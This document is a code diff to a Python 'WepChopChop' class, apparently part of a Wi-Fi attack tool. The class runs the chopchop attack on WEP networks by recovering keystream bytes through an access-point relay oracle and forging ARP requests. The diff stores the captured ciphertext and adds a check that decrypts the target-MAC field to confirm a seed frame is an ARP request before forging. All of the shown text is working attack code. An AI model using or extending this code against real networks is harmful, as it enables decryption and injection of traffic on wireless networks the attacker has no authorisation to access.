@@ -130,9 +130,11 @@ class WepChopChop:
         self._bytes_done = 0       # progress for the UI
         self._bytes_total = 0
 
-        # Current chop target's IV + KeyID (for building frames / forging).
+        # Current chop target's IV + KeyID + cipher (for frames / forging /
+        # verifying the seed is really an ARP request).
         self._cur_iv = b""
         self._cur_keyid = 0
+        self._cur_cipher = b""
         # Oracle signal: set by the RX callback when the AP relays our frame.
         self._relay_seen = False
         # Length the relay must match THIS guess. Critical: a correct guess can
@@ -189,7 +191,7 @@ class WepChopChop:
             iv, keyid, cipher = parsed
             if iv in self._tried:
                 continue
-            self._cur_iv, self._cur_keyid = iv, keyid
+            self._cur_iv, self._cur_keyid, self._cur_cipher = iv, keyid, cipher
             self._bytes_done = 0
             self._bytes_total = len(cipher) - len(_KNOWN_ARP16)
             self._log(
@@ -382,6 +384,21 @@ class WepChopChop:
         for pos, val in ks_map.items():
             ks[pos] = val
         ks[:nknown] = known_ks
+        # VERIFY the seed really is an ARP REQUEST before trusting the assumed
+        # 16-byte prefix: its target-MAC (plaintext 26..31) must be all-zero,
+        # and we recovered ks[26..31] by chopping (prefix-independent). If not,
+        # this broadcast frame isn't an ARP request — our prefix is wrong, so
+        # the forge can't work. Skip it (this is the likely "chops fine, then
+        # nada": chop is prefix-independent + succeeds, forge needs the prefix).
+        if all(p in ks_map for p in range(26, 32)) and len(self._cur_cipher) >= 32:
+            tmac = bytes(self._cur_cipher[p] ^ ks[p] for p in range(26, 32))
+            if tmac != b"\x00" * 6:
+                self._log(
+                    "[yellow]ChopChop: seed is NOT an ARP request[/yellow] "
+                    f"[dim](decrypted target-MAC = {tmac.hex()}, expected 0s — "
+                    "the assumed ARP prefix is wrong; skipping this seed)[/dim]"
+                )
+                return None
         plain = arp_request_plaintext(
             sender_mac=self.source_mac,
             sender_ip=self._sender_ip, target_ip=self._target_ip,
